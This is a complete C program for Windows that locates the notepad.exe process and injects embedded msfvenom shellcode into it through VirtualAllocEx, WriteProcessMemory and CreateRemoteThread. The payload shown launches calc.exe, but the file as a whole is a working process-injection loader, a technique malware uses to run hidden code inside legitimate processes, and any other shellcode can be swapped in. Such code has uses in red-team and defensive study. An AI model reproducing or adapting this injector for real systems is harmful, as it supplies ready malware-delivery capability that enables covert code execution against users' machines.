#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD FindProcessId(const wchar_t *processName)
{
    // Find the process ID of the target process
    DWORD processId = 0;
    PROCESSENTRY32W pe; // Note the 'W' suffix for the wide-character version
    pe.dwSize = sizeof(PROCESSENTRY32W);

    // Take a snapshot of all running processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32FirstW(hSnapshot, &pe))
    {
        do
        {
            // If the process name matches the target, save its ID and exit the loop
            if (wcscmp(pe.szExeFile, processName) == 0)
            {
                processId = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);

    return processId;
}

void InjectCode(DWORD processId, unsigned char *payload, SIZE_T payloadSize)
{
    // Open the target process with all access rights
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess)
    {
        printf("Failed to open the target process.\n");
        return;
    }

    // Allocate a memory region in the target process
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem)
    {
        printf("Failed to allocate memory in the target process.\n");
        CloseHandle(hProcess);
        return;
    }

    // Write the payload into the allocated memory region
    if (!WriteProcessMemory(hProcess, remoteMem, payload, payloadSize, NULL))
    {
        printf("Failed to write the code into the target process.\n");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Change the protection of the memory region to PAGE_EXECUTE_READ
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect))
    {
        printf("Failed to change memory protection in the target process.\n");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Create a thread in the target process that executes the payload
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hRemoteThread)
    {
        printf("Failed to create a remote thread in the target process.\n");

        // Cleanup if thread creation failed
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Wait for the remote thread to finish executing
    WaitForSingleObject(hRemoteThread, INFINITE);

    // Cleanup after the remote thread has finished executing
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

int main()
{
    // Declare target process name (wide-string)
    const wchar_t *targetProcessName = L"notepad.exe";

    // Shellcode that pops calc.exe
    // msfvenom -p windows/x64/exec CMD=calc.exe -f c
    unsigned char payload[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
    SIZE_T shellSize = sizeof(payload);

    // Find the process ID of the target process
    DWORD processId = FindProcessId(targetProcessName);

    // If we couldn't find the process, exit the program
    if (processId == 0)
    {
        wprintf(L"The target process '%s' is not running.\n", targetProcessName);
        return 1;
    }

    // Inject shellcode into remote process
    InjectCode(processId, payload, shellSize);
    return 0;
}